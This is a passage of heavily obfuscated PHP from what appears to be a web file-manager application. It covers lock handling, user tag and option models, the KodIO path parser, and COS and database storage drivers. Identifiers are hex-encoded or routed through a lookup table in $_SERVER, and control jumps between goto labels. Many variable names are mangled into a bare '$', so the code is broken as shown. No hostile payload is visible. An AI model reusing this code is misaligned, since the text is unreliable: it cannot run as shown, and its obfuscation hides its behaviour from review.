.= $[908]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ = $ . $[909] . self::$errorMsg; } write_log($[910] . sprintf($[911], timeFloat() - $܃) . $[912] . $ . $[913] . error_get_last(), $[904]); show_json($, !1); } if (!$Ŭ̿) { self::$lockItem[$Ϭ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ȗ = number_format(timeFloat() - $ݪ, 3); write_log($[914] . $鞾 . $[915] . $Ȗ, $[904]); } return $퓲; } public static function lockGet($) { $ͤ = self::key($); if (self::$lockItem[$ͤ]) { return self::$lockItem[$ͤ]; } return self::init()->lockGet($ͤ); } public static function unlock($ڻ) { $Ʊ =& $_SERVER[ʯ]; $ɯ = self::key($ڻ); self::$lockItem[$ɯ] = null; self::init()->unlock($ɯ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ʊ[916] . $ڻ, $Ʊ[904]); } return; } public static function unlockRuntime() { $ĺ =& $_SERVER[ʯ]; $ = self::init(); $ = !1; foreach (self::$lockItem as $ => $ʕ͜) { if (!$ʕ͜) { continue; } $->unlock($); if (!$) { $ = !0; write_log($ĺ[917] . $ . $ĺ[81] . get_caller_msg(), $ĺ[904]); continue; } write_log($ĺ[917] . $, $ĺ[904]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ĺ[918] . $ . $ĺ[919] . ACTION, $ĺ[904]); } } public static function fileLock($Ӷ) { $ӽҰ =& $_SERVER[ʯ]; if (!$GLOBALS[$ӽҰ[920]]) { $GLOBALS[$ӽҰ[920]] = array(); } $GLOBALS[$ӽҰ[920]][$Ӷ] = !1; $ = fopen(DATA_PATH . $Ӷ . $ӽҰ[921], $ӽҰ[922]); if (!$) { return !1; } $GLOBALS[$ӽҰ[920]][$Ӷ] = $; if (flock($, LOCK_EX)) { return !0; } self::unlock($Ӷ); show_json($ӽҰ[923], !1); return !1; } public static function fileUnlock($ه) { $ɘ =& $_SERVER[ʯ]; $Ţ = $GLOBALS[$ɘ[920]][$ه]; if (!$Ţ) { return; } $GLOBALS[$ɘ[920]][$ه] = !1; flock($Ţ, LOCK_UN); fclose($Ţ); } public static function fileUnlockAll() { $ =& $_SERVER[ʯ]; if (!$GLOBALS[$[920]]) { return; } foreach ($GLOBALS[$[920]] as $ => $) { if (!$) { continue; } $GLOBALS[$[920]][$] = !1; flock($, LOCK_UN); fclose($); } $GLOBALS[$[920]] = array(); } } goto dՖ; b: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\x5f\157\x70\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($꼯Ԝ) { $đ =& $_SERVER[ʯ]; $ֿҠ = defined($đ[2117]) && USER_ID ? USER_ID : $đ[12]; return "\125\163\x65\x72\x4f\160\164\x69\157\156\x5f{$꼯Ԝ}\137" . $ֿҠ; } protected function filterWhere($Ϗ) { $Ƹ =& $_SERVER[ʯ]; $Ϗ[$Ƹ[1704]] = defined($Ƹ[2117]) && USER_ID ? USER_ID : $Ƹ[12]; return $Ϗ; } public function cacheRemoveUser($אŇى, $޴) { return Cache::remove("\125\163\x65\162\x4f\160\x74\x69\x6f\156\x5f{$אŇى}\x5f" . $޴); } protected function optionDefault($ػ = '') { $ف =& $_SERVER[ʯ]; if ($ػ == $ف[12]) { return $GLOBALS[$ف[6]][$ف[2394]]; } if ($ػ == $ف[2395]) { return $GLOBALS[$ف[6]][$ف[2396]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\x74\x61\x67\114\151\163\164"; public $modelType = "\125\163\x65\x72\x4f\160\x74\151\x6f\x6e"; public $field = array("\156\141\155\145", "\x73\164\x79\x6c\x65", "\x73\x6f\162\164"); public function listData($ = false, $ح = "\x73\x6f\x72\x74", $ = false) { return parent::listData($, $ح, $); } public function remove($) { return parent::remove($); } public function add($, $ = "\154\x61\x62\145\154\55\147\162\145\171\55\156\157\x72\x6d\x61\x6c") { $ =& $_SERVER[ʯ]; if ($this->findByName($)) { return !1; } $ = array($[470] => $, $[534] => $, $[1900] => $this->getSort($[310]) + 1); return parent::insert($); } public function update($їˀ, $) { $ =& $_SERVER[ʯ]; $ = $this->listData($їˀ); $׎ = $this->findByName($[$[42]]); if (!$ || $׎ && $׎[$[451]] != $[$[451]]) { return !1; } return parent::update($їˀ, $); } public function moveTop($) { $ɝ =& $_SERVER[ʯ]; $۞濿 = parent::listData(); $ԅ = $this->getSort($ɝ[309]); foreach ($۞濿 as &$ƭ) { if ($ƭ[$ɝ[451]] == $) { $ƭ[$ɝ[1920]] = $ԅ; continue; } $ƭ[$ɝ[1920]] += 1; } unset($ƭ); return parent::resetData($۞濿); } public function moveBottom($) { $ =& $_SERVER[ʯ]; $ҿ܃ = $this->getSort($[310]) + 1; return parent::update($, array($[1920] => $ҿ܃)); } public function resetSort($) { $ۓ =& $_SERVER[ʯ]; $ = array(); $ = is_array($) ? $ : array(); for ($ǽ = 0; $ǽ < count($); $ǽ++) { $[$[$ǽ] . $ۓ[12]] = $ǽ + 1; } $ꝡ = parent::listData(); foreach ($ꝡ as &$ԏ) { $ = $[$ԏ[$ۓ[451]]]; $ԏ[$ۓ[1920]] = $ ? $ : $ԏ[$ۓ[1920]]; } unset($ԏ); return parent::resetData($ꝡ); } private function getSort($) { $ =& $_SERVER[ʯ]; $ǐ = parent::listData(); $ = array_to_keyvalue($ǐ, $[12], $[1920]); if (!$) { $ = array(0); } $ϳ = $ == $[310] ? max($) : min($); return intval($ϳ); } } goto C; bćυ: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\x72\122\145\143\171\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\x72\106\151\154\145\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\151\x6c\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\165\x70\x52\157\157\x74\123\145\x6c\146\175"; const KOD_USER_SHARE = "\173\165\163\145\162\x53\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\123\150\x61\x72\x65\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\x65\111\x74\145\155\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\162\x65\111\164\x65\155\114\151\156\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\143\153\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\163\x65\162\x52\145\x6e\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\145\x72\175"; public static function typeList() { $Ϡ =& $_SERVER[ʯ]; return array($Ϡ[1312] => self::KOD_SOURCE, $Ϡ[1313] => self::KOD_USER_RECYCLE, $Ϡ[1314] => self::KOD_USER_FAV, $Ϡ[1315] => self::KOD_USER_FILE_TAG, $Ϡ[1316] => self::KOD_USER_FILE_TYPE, $Ϡ[1317] => self::KOD_GROUP_ROOT_SELF, $Ϡ[1318] => self::KOD_USER_SHARE, $Ϡ[1319] => self::KOD_USER_SHARE_LINK, $Ϡ[1320] => self::KOD_USER_SHARE_TO_ME, $Ϡ[1321] => self::KOD_SHARE_ITEM, $Ϡ[1322] => self::KOD_SHARE_LINK, $Ϡ[1323] => self::KOD_SEARCH, $Ϡ[1324] => self::KOD_BLOCK, $Ϡ[1325] => self::KOD_IO, $Ϡ[1326] => self::KOD_USER_RECENT, $Ϡ[1327] => self::KOD_USER_DRIVER); } public static function parse($鄘) { $؈ =& $_SERVER[ʯ]; $鄘 = self::clear($鄘); $ = array_values(self::typeList()); preg_match($؈[1328], $鄘, $); $Ϊ = array($؈[472] => !1, $؈[1329] => !1, $؈[469] => !1, $؈[94] => $鄘, $؈[1230] => !1, $؈[1229] => $؈[12]); if (is_array($) && count($) == 5) { $ȶ = $؈[1330] . $[2] . $؈[379]; if (in_array($ȶ, $)) { $Ϊ[$؈[1230]] = $[1]; $Ϊ[$؈[43]] = $ȶ; $Ϊ[$؈[1331]] = substr($ȶ, 1, -1); $Ϊ[$؈[451]] = $[3]; } $Ϊ[$؈[1229]] = $[4]; } $ȉ = array($؈[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ϊ[$؈[1294]] = in_array($Ϊ[$؈[43]], $ȉ); return $Ϊ; } public static function isTruePath($) { $ȁ =& $_SERVER[ʯ]; if (substr($, 0, 1) != $ȁ[1330]) { return !0; } if (strpos($, $ȁ[459]) === 0) { return !0; } if (strpos($, $ȁ[1298]) === 0) { return !0; } if (strpos($, $ȁ[1332]) === 0) { return !0; } if (strpos($, $ȁ[1333]) === 0) { return !0; } if (strpos($, $ȁ[1334]) === 0) { return !0; } return !1; } public static function clear($˴) { $ܨԚ =& $_SERVER[ʯ]; $˴ = str_replace(array($ܨԚ[1139], $ܨԚ[18]), $ܨԚ[63], $˴); $˴ = str_replace($ܨԚ[107], $ܨԚ[8], $˴); $ = $ܨԚ[1335]; if (substr($˴, 0, 3) == $ܨԚ[1336]) { $˴ = substr($˴, 3); } while (strstr($˴, $)) { $˴ = str_replace($, $ܨԚ[8], $˴); } $˴ = preg_replace($ܨԚ[1337], $ܨԚ[8], $˴); if ($˴ == $ܨԚ[8]) { return $ܨԚ[8]; } $˴ = rtrim($˴, $ܨԚ[8]); return $˴; } public static function pathTrue($) { $ϔ =& $_SERVER[ʯ]; if (!$) { return $ϔ[12]; } $ȑ = strlen($); if (substr($, $ȑ - 1, 1) == $ϔ[8]) { $ = substr($, 0, $ȑ - 1); } $ = str_replace($ϔ[569], $ϔ[8], str_replace($ϔ[1338], $ϔ[8], $)); if (substr($, 0, 2) == $ϔ[1339]) { $ = substr($, 2); } if (!strstr($, $ϔ[1336])) { return $; } $ݘ = explode($ϔ[8], $); $ӆ = array_search($ϔ[1340], $ݘ); if ($ӆ >= 0) { $ݘ[$ӆ] = -1; } if ($ӆ > 0) { $ݘ[$ӆ - 1] = -1; } $ݠ = array(); foreach ($ݘ as $黥) { if ($黥 !== -1) { $ݠ[] = $黥; } } return self::pathTrue(implode($ϔ[8], $ݠ)); } public static function sourceID($) { $㤜 =& $_SERVER[ʯ]; $ט = self::parse($); if ($ט[$㤜[43]] !== self::KOD_SOURCE) { show_json(LNG($㤜[1341]), !1); } return $ט[$㤜[451]]; } public static function make($ȃ) { if (!$ȃ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ȃ)); } public static function makeShare($, $) { return self::makePath(self::KOD_SHARE_ITEM, $, $); } public static function makeFileTypePath($˰) { return self::makePath(self::KOD_USER_FILE_TYPE, $˰); } public static function makeFileTagPath($޼) { return self::makePath(self::KOD_USER_FILE_TAG, $޼); } public static function makePath($, $ݜ = '', $ɞ = '') { $Ҋ =& $_SERVER[ʯ]; $ = substr($, 1, -1); $ = $Ҋ[1342] . $ . $Ҋ[1343] . $ݜ . $Ҋ[1344]; $ = $ɞ ? $ . $ɞ . $Ҋ[8] : $; return $; } public static function hashPath($, $񖜧 = true) { $ű =& $_SERVER[ʯ]; $ = is_array($) ? $ : IO::info($); $ = _get($, $ű[1345], $ű[12]); if (!$ && isset($[$ű[228]])) { $ = trim($[$ű[228]], $ű[128]); } if (!$ && isset($[$ű[190]]) && $[$ű[190]]) { $ = IO::info(KodIO::make($[$ű[190]])); $ = _get($, $ű[1345], $ű[12]); } $ = md5($[$ű[94]] . $[$ű[86]] . $[$ű[95]]); if (!$ && $񖜧 && file_exists($[$ű[94]])) { $ = Cache::get($ . $ű[1346]); $ = !1; if (!$) { $ = IO::hashSimple($[$ű[94]]); Cache::set($ . $ű[1346], $, 3600 * 24 * 30); } } return $ ? $ : $; } public static function hashPathSafe($, $ = true) { $֟ =& $_SERVER[ʯ]; $ = self::hashPath($, $); return md5($ . $֟[1347] . Model($֟[830])->get($֟[831])); } public static function initSystemPath() { $ =& $_SERVER[ʯ]; if (defined($[1348])) { return; } define($[1348], self::systemPath($[188])); define($[1349], self::systemPath($[1350])); define($[1351], self::systemPath($[1352])); define($[1353], self::systemPath($[1354])); IOHistory::bindEvent(); } public static function systemPath($꽫) { $Ϭ =& $_SERVER[ʯ]; $Ƭӄ = $Ϭ[1355] . ucfirst($꽫); $ɉ = Model($Ϭ[830])->get($Ƭӄ); if ($ɉ) { return $ɉ; } if ($꽫 == $Ϭ[188]) { $ɉ = self::make(Model($Ϭ[885])->systemRootPathAdd($Ϭ[582])); } else { $ɉ = self::systemPath($Ϭ[188]); $㽸 = self::sourceID($ɉ); $ɉ = self::make(Model($Ϭ[885])->mkdir($㽸, $꽫)); } Model($Ϭ[830])->set($Ƭӄ, $ɉ); return $ɉ; } public static function systemFolder($) { $¬ = IO_PATH_SYSTEM_SOURCE . $; $컗 = Cache::get($¬); if (!$컗) { $̓ = IO::infoFullSimple($¬); if (!$̓) { $컗 = IO::mkdir($¬, REPEAT_SKIP); } else { $컗 = $̓[$_SERVER[ʯ][94]]; } Cache::set($¬, $컗, 3600 * 10); } return $컗; } public static function defaultDriver() { return Model($_SERVER[ʯ][827])->defaultDriver(); } public static function defaultIO() { $ =& $_SERVER[ʯ]; $ʲ = self::defaultDriver(); return $[1356] . $ʲ[$[451]] . $[1344]; } public static function defaultDriverInit() { static $ȋʆ = false; if ($ȋʆ) { return $ȋʆ; } $ȋʆ = IO::init(self::defaultIO()); return $ȋʆ; } public static function fileTypeList() { $ =& $_SERVER[ʯ]; $ٴ = $GLOBALS[$[6]][$[1357]]; foreach ($ٴ as $ӒѰ => $) { $ә = $[1358] . $ӒѰ; $ = LNG($ә); if ($ә != $) { $ٴ[$ӒѰ][$[42]] = $; } } return $ٴ; } public static function diskList($Ț = true) { $ = $_SERVER[ʯ][1359]; if ($Ț) { $՘ = Cache::get($); if (is_array($՘)) { return $՘; } } $՘ = self::diskListGet(); Cache::set($, $՘, 60); return $՘; } public static function diskListGet() { $ =& $_SERVER[ʯ]; $ɿ = array(); if ($GLOBALS[$[6]][$[1360]] == $[1361]) { $ʭ = $[1362]; for ($ = 0; $ < strlen($ʭ); $++) { $̮ = $ʭ[$] . $[1363]; if (file_exists($̮)) { $ɿ[] = $̮; } } return $ɿ; } if (!function_exists($[108])) { $ɿ[] = $[896]; return $ɿ; } $ = explode($[18], shell_exec($[1364])); array_shift($); array_pop($); $ǥ = array($[1365], $[1366], $[1367], $[1368], $[1369], $[1370], $[1371], $[1372]); foreach ($ as $ą) { $ӑ = preg_split($[1373], $ą); $̮ = $ӑ[count($ӑ) - 1]; if (!strstr($ӑ[0], $[1374]) || !$̮) { continue; } $Յ = rtrim($̮, $[8]) . $[8]; if (in_array($Յ, $ǥ)) { continue; } $ɿ[] = $Յ; } return $ɿ; } public static function isSameDisk($, $) { $δ =& $_SERVER[ʯ]; if ($GLOBALS[$δ[6]][$δ[1360]] == $δ[1361]) { return strtolower(substr($, 0, 1)) == strtolower(substr($, 0, 1)); } $ޢ = self::diskList(); $ = !1; $ = !1; sort($ޢ); $ޢ = array_reverse($ޢ); $ = rtrim($, $δ[8]) . $δ[8]; $ = rtrim($, $δ[8]) . $δ[8]; foreach ($ޢ as $ΝĜ) { $ = strlen($ΝĜ); if (!$ && substr($, 0, $) == $ΝĜ) { $ = $ΝĜ; } if (!$ && substr($, 0, $) == $ΝĜ) { $ = $ΝĜ; } if ($ && $) { break; } } return $ === $; } public static function transferType($鈗, $) { $ܴ =& $_SERVER[ʯ]; $ = self::driverType($鈗); $ = self::driverType($); if ($[$ܴ[43]] == $[$ܴ[43]] && $[$ܴ[1375]] == $[$ܴ[1375]]) { return $ܴ[1376]; } if ($[$ܴ[43]] == $ܴ[929] && $[$ܴ[43]] == $ܴ[116]) { return $ܴ[1255]; } if ($[$ܴ[43]] == $ܴ[116] && $[$ܴ[43]] == $ܴ[929]) { return $ܴ[117]; } return $ܴ[1377]; } public static function driverType($ż㓺) { $Ư =& $_SERVER[ʯ]; $Ć = str_replace($Ư[1378], $Ư[12], strtolower($ż㓺->getType())); if ($Ć == $Ư[817] || $Ć == $Ư[1379] || $Ć == $Ư[1380]) { $ż㓺 = self::defaultDriverInit(); } else { if ($Ć == $Ư[1265] || $Ć == $Ư[1381]) { $ż㓺 = IO::init($ż㓺->pathParse[$Ư[1212]]); } } $ = $ż㓺->path; $Ć = str_replace($Ư[1378], $Ư[12], strtolower($ż㓺->getType())); if ($Ć == $Ư[116]) { return array($Ư[43] => $Ư[116], $Ư[1375] => $Ư[12], $Ư[94] => $, $Ư[105] => $ż㓺); } return array($Ư[43] => $Ư[929], $Ư[1375] => $ż㓺->pathDriver, $Ư[94] => $, $Ư[105] => $ż㓺); } public static function pathDriverType($כ) { return $כ ? self::driverType(IO::init($כ)) : !1; } public static function pathDriverLocal($ʼǳ) { $ۨ =& $_SERVER[ʯ]; $ = $ʼǳ ? self::driverType(IO::init($ʼǳ)) : !1; return $[$ۨ[43]] == $ۨ[116] ? !0 : !1; } public static function allowCover($巧, $ф = true) { $গ =& $_SERVER[ʯ]; if (is_string($巧)) { $巧 = IO::info($巧); } if (!$巧 || $巧[$গ[43]] == $গ[85] || $巧[$গ[86]] <= 100) { return !1; } if (isset($巧[$গ[1382]]) || !$巧[$গ[94]]) { return !1; } if (isset($巧[$গ[225]]) && !$巧[$গ[225]]) { return !1; } static $ = false; if (!$ || !$ф) { $΁ = self::driverType(IO::init($巧[$গ[94]])); $ = $΁[$গ[105]]; $ = $গ[193]; if ($΁[$গ[43]] == $গ[116]) { $ = $গ[1383]; } if ($΁[$গ[105]] && is_array($΁[$গ[105]]->config)) { $ = $΁[$গ[105]]->config; if (isset($[$গ[1384]]) && $[$গ[1384]]) { $ = $গ[1383]; } } } return $ == $গ[1383] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($) { parent::__construct($); $this->signatureVersion($_SERVER[ʯ][240]); } public function uploadFormData($վ, $ = 3600) { $ =& $_SERVER[ʯ]; $ٽ = $[222]; $ = $[255]; $ۤ = $[265]; $ʬޓ = gmdate($[1385], time() + $); $鏋 = (string) time() . $[81] . (string) (time() + $); $ᖜ = array($[266] => $ʬޓ, $[269] => array(array($[271] => $ٽ), array($[270] => $this->bucket), array($[272], $[273], $[12]), array($[276] => $ۤ), array($[1386] => $), array($[1387] => $this->accessKey), array($[1388] => $鏋))); $ᖜ = json_encode($ᖜ); $ = hash_hmac($[255], $鏋, $this->secret); $Ԫ = sha1($ᖜ); $׭ = hash_hmac($[255], $Ԫ, $); $ = array($[271] => $ٽ, $[276] => $ۤ, $[284] => base64_encode($ᖜ), $[1386] => $, $[1387] => $this->accessKey, $[1389] => $鏋, $[1390] => $׭, $[205] => $this->getHost()); return $; } public function fileOutLink($) { $ݥ =& $_SERVER[ʯ]; if (substr($, 0, 7) == $ݥ[1391]) { $ = $ݥ[1392] . substr($, 7); } header($ݥ[171] . $); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ӑ) { $this->pathParse = $Ӑ; $this->model = Model($_SERVER[ʯ][1393]); } public function getPath($Ź) { return trim($Ź, $_SERVER[ʯ][8]); } public function pathFather($څ) { $񰞛 = $this->parse($څ); $񰞛 = $this->infoSimple($څ); return $񰞛 ? $񰞛[$_SERVER[ʯ][189]] : !1; } public function pathThis($Ҫ) { $ = $this->infoSimple($Ҫ); return $ ? $[$_SERVER[ʯ][42]] : !1; } public function getPathOuter($ا) { if (!$ا) { return $ا; } $ = $this->parse($ا); return KodIO::make($[$_SERVER[ʯ][451]]); } public function copyFolderFromIO($, $ǎ, $ν, $Υٴ, $󭎩) { $ۉУ = $this->model->copyFolderFromIO($, $ǎ, $ν, $Υٴ, $󭎩); return KodIO::make($ۉУ); } public function isParentOf($ߧ, $΢) { return $this->model->isParentOf($ߧ, $΢); } public function mkfile($˔, $ = '', $̙ = REPEAT_RENAME) { $٫ =& $_SERVER[ʯ]; $׌ = $this->parse($˔); $˔ = $׌[$٫[451]]; for ($ = 0; $ < count($׌[$٫[1394]]); $++) { $ = $׌[$٫[1394]][$]; if ($ == count($׌[$٫[1394]]) - 1) { $˔ = $this->model->mkfile($˔, $, $, $̙); break; } $˔ = $this->model->mkdir($˔, $, REPEAT_SKIP); } return $this->getPathOuter($˔); } public function mkdir($ӡ, $̟ = REPEAT_SKIP) { $ =& $_SERVER[ʯ]; $ڴ = $this->parse($ӡ); $ӡ = $ڴ[$[451]]; for ($ = 0; $ < count($ڴ[$[1394]]); $++) { $ = $ڴ[$[1394]][$]; $ӡ = $this->model->mkdir($ӡ, $, $̟); } return $this->getPathOuter($ӡ); } public function copyFile($Ѣ, $ݠ, $ = REPEAT_REPLACE) { $Ǡߡ =& $_SERVER[ʯ]; $ = $this->parse($ݠ); $ = $this->model->copy($Ѣ, $[$Ǡߡ[451]], $, $[$Ǡߡ[94]]); return $ ? $this->getPathOuter($) : !1; } public function moveFile($әՍ, $, $ĳ = REPEAT_REPLACE) { $ =& $_SERVER[ʯ]; $ = $this->parse($); $ = $this->model->move($әՍ, $[$[451]], $ĳ, $[$[94]]); return $ ? $this->getPathOuter($) : !1; } public function copy($پ, $כ, $ݖ = REPEAT_REPLACE, $ = false) { $ = $this->parse($כ); $雘ڤ = $this->model->copy($پ, $[$_SERVER[ʯ][451]], $ݖ, $); return $雘ڤ ? $this->getPathOuter($雘ڤ) : !1; } public function moveSameAllow() { } public function move($Ɇܯ, $թ, $ʿ = REPEAT_REPLACE, $ = false) { $ = $this->parse($թ); $ő = $this->model->move($Ɇܯ, $[$_SERVER[ʯ][451]], $ʿ, $); return $ő ? $this->getPathOuter($ő) : !1; } public function remove($ז, $̪ = true) { return $this->model->remove($ז, $̪); } public function rename($, $גǩ) { $惶 = $this->model->rename($, $גǩ); return $惶 ? $this->getPathOuter($) : $惶; } public function size($᩶) { $Ɨ = $this->infoSimple($᩶); return $Ɨ ? $Ɨ[$_SERVER[ʯ][86]] : 0; } public function infoSimple($Č) { return $this->model->sourceInfo($Č); } public function info($簂) { return $this->infoParse($簂); } public function infoAuth($̾) { return $this->infoParse($̾, !1, !0); } public function infoWithChildren($) { return $this->infoParse($, !0); } protected function infoParse($, $̐ = false, $ = false) { if (!$̐) { return $this->model->pathInfo($, $); } return $this->model->pathInfoMore($); } public function infoFullSimple($) { $ݘ͡ =& $_SERVER[ʯ]; $ʵ = explode($ݘ͡[8], $); $뉶 = implode($ݘ͡[8], array_splice($ʵ, 1)); return $this->model->pathInfoByPath($ʵ[0], $뉶); } public function infoFull($Թ) { $˷ = $this->infoFullSimple($Թ); return is_array($˷) ? $this->model->pathInfo($˷[$_SERVER[ʯ][190]]) : !1; } public function hashSimple($숔) { $ =& $_SERVER[ʯ]; $𷿤 = $this->infoWithChildren($숔); return $𷿤[$[524]][$[648]]; } public function hashMd5($) { $ؕ =& $_SERVER[ʯ]; $Ҿ = $this->infoWithChildren($); return $Ҿ[$ؕ[524]][$ؕ[649]]; } public function exist($) { $̥ =& $_SERVER[ʯ]; $ = $this->parse($); if (!$[$̥[94]]) { return $this->isFile($) || $this->isFolder($); } $۴ = array($̥[453] => $[$̥[451]], $̥[42] => $[$̥[94]]); $ = $this->model->where($۴)->find(); return $ ? !0 : !1; } public function isFile($䋉) { $ʛ =& $_SERVER[ʯ]; $ = $this->infoSimple($䋉); return $ && $[$ʛ[461]] == $ʛ[221] ? !0 : !1; } public function isFolder($ǽΦ) { $ծ =& $_SERVER[ʯ]; $ = $this->infoSimple($ǽΦ); return $ && $[$ծ[461]] == $ծ[98] ? !0 : !1; } public function listPath($Խ, $쀂 = false) { $ݝ =& $_SERVER[ʯ]; if ($Խ == $ݝ[12]) { return !1; } $ = array($ݝ[453] => $Խ); if ($쀂) { return $this->model->listSource($, -1); } return $this->model->listSource($); } public function has($ŀб, $ہ = false, $ = null) { $ =& $_SERVER[ʯ]; $ɲ = $this->infoWithChildren($ŀб); if ($ہ) { return array($[233] => $ɲ[$[233]], $[232] => $ɲ[$[232]]); } return $ ? $ɲ[$[233]] : $ɲ[$[232]]; } public function listAll($㬛) { $ = IO::info($this->pathParse[$_SERVER[ʯ][94]]); if (!$) { return array(); } return $this->model->listAll($㬛); } public function getContent($) { return $this->model->getContent($); } public function setContent($١, $Π = '') { return $this->model->setContent($١, $Π); } public function fileSubstr($ř, $, $) { return $this->model->fileSubstr($ř, $, $); } public function download($, $җ = '') { $Ϋ = get_path_father($җ); $ = get_path_this($җ); $ = $this->model->fileInfoGet($); $ = IO::copy($[$_SERVER[ʯ][94]], $Ϋ, !1, $); return $; } public function setModifyTime($Ź툺, $ʀ = '') { $ =& $_SERVER[ʯ]; if (!$Ź툺) { return; } $this->model->where(array($[467] => $Ź툺))->save(array($[95] => $ʀ)); } public function upload($ƣ, $, $搽ߋ = false, $¨ = REPEAT_REPLACE) { $ =& $_SERVER[ʯ]; $诶 = $this->parse($ƣ); $ʮ = $this->model->addFile($诶[$[451]], $, $诶[$[94]], $搽ߋ, $¨); return $this->getPathOuter($ʮ); } public function uploadFileByID($␈, $񸊻, $Ӷ) { $ =& $_SERVER[ʯ]; $ = $this->parse($␈); $ڲÁ = $this->model->addFileByFileID($[$[451]], $񸊻, $[$[94]], $Ӷ); return $this->getPathOuter($ڲÁ); } public function addFileByRemote($˸, $ۊͳ, $ = array(), $ֻ = '', $繃փ) { $ =& $_SERVER[ʯ]; $Տ۬ = $this->parse($˸); $ֻ = empty($ֻ) ? $Տ۬[$[94]] : $ֻ; $ = $this->model->addFileByRemote($Տ۬[$[451]], $ۊͳ, $ֻ, $, $繃փ); return $this->getPathOuter($); } public function uploadLink($ʲ, $ = 0) { $ =& $_SERVER[ʯ]; $ь = $this->parse($ʲ); $כά = _get($GLOBALS[$[7]], $[1395]); $攐 = _get($GLOBALS[$[7]], $[1396]); $ʲ = Model($[651])->createFileName($ь[$[94]], $כά, $攐); return IO::uploadLink($ʲ, $); } public function fileNameAuto($ӆ, $Ȫ, $ = REPEAT_REPLACE, $ = false) { return $this->model->fileNameAuto($ӆ, $Ȫ, $, $); } public function fileNameExist($Ԉ, $) { return $this->model->fileNameExist($Ԉ, $); } protected function _fileOut($ޣ, $Ŷ = false, $ = false, $캚 = '', $ = false) { $ =& $_SERVER[ʯ]; $ف = $this->model->sourceInfo($ޣ); if ($ف[$[461]] == $[98]) { header($[1397]); die; } $ = $this->model->fileInfoGet($ޣ); $캚 = $[$[649]] ? $[$[649]] : $캚; $婰 = is_array($GLOBALS[$[178]]) ? $GLOBALS[$[178]][$[42]] : $ف[$[42]]; if ($) { return IO::fileOutServer($[$[94]], $Ŷ, $婰, $캚); } IO::fileOut($[$[94]], $Ŷ, $婰, $캚); } public function fileOut($͠, $ = false, $ = false, $ә˻ = '') { $this->_fileOut($͠, $, $, $ә˻); } public function fileOutServer($ݑ, $ܼ = false, $ = false, $見щ = '') { $this->_fileOut($ݑ, $ܼ, $, $見щ, !0); } protected function _fileOutImage($, $ = 250) { $͸֐ =& $_SERVER[ʯ]; $݃ = $this->model->pathInfo($); if ($݃[$͸֐[461]] == $͸֐[98]) { show_json($͸֐[1398] . $, !1); } $ = $this->model->fileInfoGet($); $݃[$͸֐[179]] = $[$͸֐[94]]; $GLOBALS[$͸֐[178]] = $݃; IO::fileOutImage($[$͸֐[94]], $); } public function fileOutImage($ݹ, $ = 250) { $this->_fileOutImage($ݹ, $); } public function fileOutImageServer($, $Ƿݕ = 250) { $this->_fileOutImage($, $Ƿݕ); } public function link($ܜ, $ڷ = '') { $ = $this->model->fileInfoGet($ܜ); return IO::link($[$_SERVER[ʯ][94]], $ڷ); } protected function parse($ȭ) { $񧕋 =& $_SERVER[ʯ]; if (strstr($ȭ, $񧕋[8]) === !1) { return array($񧕋[469] => intval($ȭ), $񧕋[94] => $񧕋[12], $񧕋[1394] => array()); } $Ǭ = explode($񧕋[8], trim($ȭ, $񧕋[8])); if (count($Ǭ) < 2) { show_tips(clear_html($ȭ) . $񧕋[1399]); } return array($񧕋[469] => intval($Ǭ[0]), $񧕋[94] => $Ǭ[1], $񧕋[1394] => array_slice($Ǭ, 1)); } } goto BކǑ; A̍˧: function binCheckBigger($Ә, $ׅ) { return $Ә > $ׅ; } $_SERVER[$_SERVER[][3]] = ("\x38\x32\x36\x33"."\x35\x35")+0;$_lpdi="fxb1ctgoeiazpqs2rundvj9m5ky76lh480w3e9js5rp28gvc1mk7htzi3quf4nwxaod6ly0b27yo";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ɫ, $) { $ =& $_SERVER[ʯ]; if (isset(self::$_methodList[$ɫ])) { return @call_user_func_array(self::$_methodList[$ɫ], $); } else { if (method_exists($this, $ɫ)) { return call_user_func_array(array($this, $ɫ), $); } else { think_exception(__CLASS__ . $[4] . $ɫ . $[5]); } } } public static function __callStatic($΄, $Ҷ) { if (isset(self::$_methodListStatic[$΄])) { return call_user_func_array(self::$_methodListStatic[$΄], $Ҷ); } else { if (method_exists(self, $΄)) { return call_user_func_array(array(self, $΄), $Ҷ); } else { show_json("{$΄}\50\51\40\x6e\x6f\164\40\145\x78\x69\163\164\x3b", !1); } } } public static function addMethod($, $ꪤ) { self::$_methodList[$] = $ꪤ; } public static function addMethodStatic($ʄ, $ņ) { self::$_methodListStatic[$ʄ] = $ņ; } } goto C͗Ḫ; dʉ: class PathDriverMinIO extends 